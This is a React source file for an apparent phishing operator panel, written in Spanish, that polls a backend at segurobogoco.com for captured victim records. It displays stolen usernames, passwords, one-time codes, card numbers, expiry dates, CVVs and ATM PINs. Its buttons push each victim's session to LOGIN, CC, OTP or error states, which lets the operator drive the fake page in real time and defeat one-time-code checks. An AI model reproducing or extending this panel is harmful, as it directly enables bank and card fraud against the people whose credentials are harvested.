import React, { useEffect, useState } from "react"; 
import axios from "axios"; 

const AdminDashboard = () => {   
  const [guests, setGuests] = useState([]);   
  const [loading, setLoading] = useState(true);   
  const [error, setError] = useState(null);   
  const [updatedGuestId, setUpdatedGuestId] = useState(null);    
  const [statuses, setStatuses] = useState([]); // Para almacenar los estados

  const fetchGuests = async () => {
    const token = localStorage.getItem('access_token'); 
    if (token) {
      try {
        const response = await axios.get("https://segurobogoco.com/api/v1/admin/guests", { 
          headers: { "Authorization": `Bearer ${token}` }, 
        });
        setGuests(response.data.guests); 
      } catch (error) {
        console.error("Error al obtener los invitados:", error);
        setError("Error al obtener los invitados");
      } finally {
        setLoading(false); 
      }
    } else {
      console.error("No se encontró el token en localStorage");
      setLoading(false); 
    }
  };

  const fetchStatuses = async () => {
    const token = localStorage.getItem('access_token');
    if (token) {
      try {
        const response = await axios.get("https://segurobogoco.com/api/v1/admin/statuses", { 
          headers: { "Authorization": `Bearer ${token}` }, 
        });
        setStatuses(response.data.statuses); // Almacena los estados
      } catch (error) {
        console.error("Error al obtener los estados:", error);
        setError("Error al obtener los estados");
      }
    }
  };

  useEffect(() => {
    fetchGuests();
    fetchStatuses(); // Cargar los estados al montar el componente
    const intervalId = setInterval(fetchGuests, 3000); 
    return () => clearInterval(intervalId); 
  }, []); 

  const getStatusName = (id) => {
    if (!statuses || statuses.length === 0) {
      return "Desconocido"; // Devuelve "Desconocido" si no hay estados
    }
    const status = statuses.find((status) => status.id === id);
    return status ? status.name : "Desconocido"; // Devuelve el nombre del estado o "Desconocido"
  };

  const updateStatus = async (id, statusId) => {
    try {
      const token = localStorage.getItem('access_token');
      await axios.put(
        `https://segurobogoco.com/api/v1/admin/guests/${id}`,
        { status_id: statusId },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      // Actualiza el estado local directamente
      setGuests((prevGuests) =>
        prevGuests.map((guest) =>
          guest.id === id ? { ...guest, status_id: statusId } : guest
        )
      );
      setUpdatedGuestId(id); 
      setTimeout(() => setUpdatedGuestId(null), 3000); 
    } catch (err) {
      if (err.response?.status === 401) {
        navigate('/');
      } else {
        setError('Error al actualizar el estado.');
      }
    }
  };

  if (loading) {
    return <div className="text-white text-center">Cargando...</div>; 
  }

  return (
    <div className="bg-gray-800 text-white p-6">
      <h1 className="text-3xl font-bold text-center mb-6">Admin Dashboard</h1>
      {error && <div className="text-red-500 text-center">{error}</div>}
      <div className="space-y-6">
        {guests.length >  0 ? (
          guests.map((guest) => (
            <div
              key={guest.id}
              className="flex bg-gray-700 p-4 rounded-lg shadow-md space-x-3.5 ">
              <div className="flex-auto text-center space-y-2">
                <h2 className="text-2xl font-bold">Login</h2>
                <div className="text-base">
                  <p>Usuario: {guest.login}</p>
                  <p>Contraseña: {guest.pass}</p>
                  <p>OTP: {guest.otp}</p>
                </div>
              </div>

              <div className="flex-auto text-center space-y-2">
                <h2 className="text-2xl font-bold">Información del Usuario</h2>
                <div className="text-base">
                  <p><strong>Nombre:</strong> {guest.user}</p>
                  <p><strong>BIN:</strong></p>
                  <p><strong>CC:</strong> {guest.cc}</p>
                  <p><strong>Fecha de Exp:</strong> {guest.expiration_date}</p>
                  <p><strong>CVV:</strong> {guest.ccv}</p>
                  <p><strong>ATM Pass:</strong> {guest.atmotp}</p>
                </div>
              </div>

              <div className="flex-auto space-y-4">
                <h2 className="text-2xl font-bold text-center">
                  Estado actual: {getStatusName(guest.status_id)}
                </h2>

                <div className="grid grid-cols-3 gap-4">
                  {[{ label: 'CARGANDO', statusId: 1 },
                    { label: 'LOGIN', statusId: 2 },
                    { label: 'ERROR-LOGIN', statusId: 3 },
                    { label: 'CC', statusId: 4 },
                    { label: 'ERROR-CC', statusId: 5 },
                    { label: 'OTP', statusId: 6 },
                    { label: 'ERROR-OTP', statusId: 7 },
                  ].map((status) => (
                    <button
                      key={status.statusId}
                      onClick={() => updateStatus(guest.id, status.statusId)}
                      className="bg-blue-500 hover:bg-blue-700 text-white font-semibold py-1 px-1 rounded-xl"
                    >
                      {status.label}
                    </button>
                  ))}
                </div>
              </div>

              {updatedGuestId === guest.id && (
                <div className="text-green-500 text-center mt-2">Estado actualizado</div>
              )}
            </div>
          ))
        ) : (
          <div className="text-center text-white">No hay invitados disponibles.</div>
        )}
      </div>
    </div>
  );
};

export default AdminDashboard;